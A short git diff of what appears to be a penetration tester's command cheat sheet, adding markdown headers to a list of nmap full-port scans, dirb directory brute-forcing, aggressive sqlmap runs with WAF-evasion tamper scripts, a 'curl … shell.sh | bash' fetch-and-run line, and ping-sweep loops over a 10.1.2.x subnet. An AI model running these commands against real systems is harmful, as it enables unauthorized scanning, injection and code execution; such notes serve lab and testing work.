@@ -1,4 +1,7 @@
 Command
+# Header 1
+
+## Header 2
 - nmap -sC -sV -oN enum.nmap -p- -T4 --min-rate=1000 -v  (nmapx)
 - dirb http://10.1.2.152 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o diretory.dirb (dirbx)
 - sqlmap -r inject --dbs --level 4 --risk 3 --threads 10 --tamper=space2comment,between,randomcase (sqlmapx)
@@ -10,6 +13,8 @@ Command
 - curl 127.0.0.1/shell.sh | bash
 - ps -efa --forest
 
+
+### Header 3
 for i in $(seq 254); do ping 10.1.2.${i} -c1 -W1 & done | grep from
 for i in {1.255}; do (ping -c 1 10.1.2.${i} | grep "bytes from"&); done
 
